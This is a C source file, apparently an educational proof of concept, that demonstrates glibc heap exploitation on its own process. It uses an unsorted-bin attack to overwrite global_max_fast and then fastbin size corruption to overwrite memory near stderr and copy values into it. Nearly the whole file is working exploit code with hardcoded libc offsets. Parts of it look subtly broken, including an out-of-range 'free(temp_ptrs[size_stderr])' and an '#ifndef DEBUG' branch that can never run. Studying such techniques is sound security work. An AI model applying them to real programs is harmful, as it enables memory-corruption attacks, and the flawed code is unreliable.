//Advantage3: Transplant value from almost arbitrary higher addr from almost arbitrary higher addr
#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>
#include<string.h>
#include<assert.h>

#define ull unsigned long long
#define DEBUG 0
#define WAIT while(fgetc(stdin)!='\n');

//A and tmp1 should be the same except for LSByte
#define GET_CLOSE_CHUNK(A,B,tmp1,tmp2,sz,LSB_A,padd_size)\
  malloc(padd_size);\
  tmp1 = malloc(0x50);\
  A = malloc(0x20);\
  B = malloc(0x20);\
  tmp2 = malloc(0x50);\
  assert(((unsigned long)tmp1&0xff)<((unsigned long)A&0xff) && ((unsigned long)tmp1&0xff)<0xa0);\
  free(tmp1);\
  free(tmp2);\
  ((char*)tmp2)[0] = LSB_A;\
  tmp2 = malloc(0x50);\
  tmp1 = malloc(0x50);\
  printf("[-]A: %p\n",A);\
  printf("[-]B: %p\n",B);\
  printf("[-]tmp1: %p\n",tmp1);\
  printf("[-]tmp2: %p\n",tmp2);\
  tmp1[1] = (sz+0x10)|1;\
  tmp1[6] = 0;\
  tmp1[7] = (sz+0x10)|1;


ull *LSBs_gmf = 0x6940; //LSByte of global_max_fast. Third nibble has 4bit entropy
ull *off_gmf_libcbase = 0x3ed940; //offset between global_max_fast & libcbase
ull *off_stdout_libcbase = 0x3ec760; //offset between stdout & libcbase
ull *off_arena_libcbase = 0x3ebc40; //offset between main_arena & libcbase

unsigned size_formula(unsigned long delta){
  return (unsigned)(delta*2 + 0x20);
}

int main(int argc, char *argv[])
{
  WAIT

  // calc and get some addrs
  char num;
  ull *addr_stdout = stdout;
  ull *libcbase = (ull)addr_stdout - (ull)off_stdout_libcbase;
  ull *addr_gmf = (ull)off_gmf_libcbase + (ull)libcbase;
  ull *addr_main_arena = (ull)libcbase + (ull)off_arena_libcbase;
  ull *addr_fastbinY = (ull)addr_main_arena + 0x10;
  ull size_stderr = size_formula((ull)stderr - (ull)addr_fastbinY - 0x8); //SRC
  ull size_stderr0x60 = size_formula((ull)stderr - (ull)addr_fastbinY - 0x8 + 0x60); //TARGET
  ull *attack,*A,*B,*tmp1,*tmp2,*padd, *chunk_fake_size;
  ull *target = 0;
  ull temp;
  ull *temp_ptrs[10];
  printf("Advantage 3\n");
  printf("_________________________\n\n");
  printf("* unsortedbin attack *\n");
  printf("[+]&global_max_fast: %p\n",addr_gmf);

  // alloc some chunks (0x30 for avoiding consolidation)
  unsigned long *a = malloc(0x450); //for unsortedbin attack
  malloc(0x30);
  unsigned long *a2 = malloc(0x450);
  malloc(0x30);
  unsigned long *a3 = malloc(0x450);
  malloc(0x30);

  // prepare for preparation
  printf("[+]global_max_fast: 0x%llx\n",*addr_gmf);
  attack = malloc(size_stderr);
  
  // prepare for Advantage 3
  GET_CLOSE_CHUNK(A,B,tmp1,tmp2,size_stderr0x60,0x70,0x30); //LSBytes sensitive!!
  chunk_fake_size = malloc(size_stderr0x60 + 0x100); //make fake size for fake fastbin's next chunk
  for(int ix=0;ix!=(size_stderr0x60+0x100)/0x10;++ix){
    *(chunk_fake_size+0+ix*2) = 0x0;
    *(chunk_fake_size+1+ix*2) = 0x30|1;
  }

  //free and UAF
  free(a); //connect to unsortedbin
  
  //overwrite the 2nibble of unsortedbin's bk with global_max_fast's address
#ifndef DEBUG
  for(int ix=0;ix!=2;++ix){ //victim->bk
    temp = (unsigned long long)LSBs_gmf >> (8*ix);
    num = temp % 0x100;
    if(ix==0)
      num -= 0x10;
    *(char*)((unsigned long long)a+8+ix) = num;
  }
#else
  for(int ix=0;ix!=8;++ix){ //cheat for the simplicity
    temp = (ull)addr_gmf >> (8*ix);
    num = temp % 0x100;
    if(ix==0)
      num -= 0x10;
    *(char*)((ull)a+8+ix) = num;
  }
#endif

  //unsorted bin attack:
  printf("[*]unsortedbin attack...\n"); 
  malloc(0x450);
  printf("[+]global_max_fast: 0x%llx\n",*addr_gmf);
  
  //check whether the unsorted attack is success or not
  if(*addr_gmf != (ull)addr_main_arena+0x60){
    printf("\n\n[-]FAIL: unsortedbin attack\n");
    exit(0);
  }else{
    printf("\n[!]SUCCESS: unsortedbin attack\n");
  }


  /**Advantage 2: Overwrite almost arbitrary addr with arbitrary addr**/
  printf("\n* Advantage 2 *\n");
  printf("[+]Target address: %p (stderr)\n",stderr);
  printf("[+]stderr: %llx\n",*(ull*)stderr);
  if((ull)size_stderr <= 0x408){ // if the size is small enough for tcaching
    for(int ix=0;ix!=7;++ix){ //consume tcache
      temp_ptrs[ix] = malloc(size_stderr);
    }
    for(int ix=0;ix!=7;++ix){
      free(temp_ptrs[size_stderr]);
    }
  }
  printf("[*]attack1...\n");
  free(attack);
  printf("[!]stderr: %llx\n",*(ull*)stderr);

  printf("[*]attack2...\n");
  attack[0] = 0xdeadbeefcafebabe;
  malloc(size_stderr);
  printf("[!]stderr: %llx\n",*(ull*)stderr);

  /**Advantage 3: Transplant the value**/
  printf("\n* Advantage 3 *\n");
  printf("[+]Target addr where transplant from stderr: %p\n",(ull*)((ull)stderr+0x60));
  printf("[+]Target's value: 0x%llx\n",*(ull*)((ull)stderr+0x60));

  free(B);
  free(A);
  ((char*)A)[0] = 0x70; //overwrite fd's LSByte
  WAIT
  A = malloc(size_stderr0x60);

  tmp1[1] = (0x10 + size_stderr)|1; //overwrite A' sz to src(fastbin of B)
  free(A);

  tmp1[1] = (0x10 + size_stderr0x60)|1; //to avoid error when malloc
  printf("[*]attack...\n");
  malloc(size_stderr0x60);
  printf("[!]Target's value: 0x%llx\n",*(ull*)((ull)stderr+0x60));

  printf("\n\nCan you understand? Debug by yourself now.\n");

  //debugging time
  WAIT

  return 0;
}
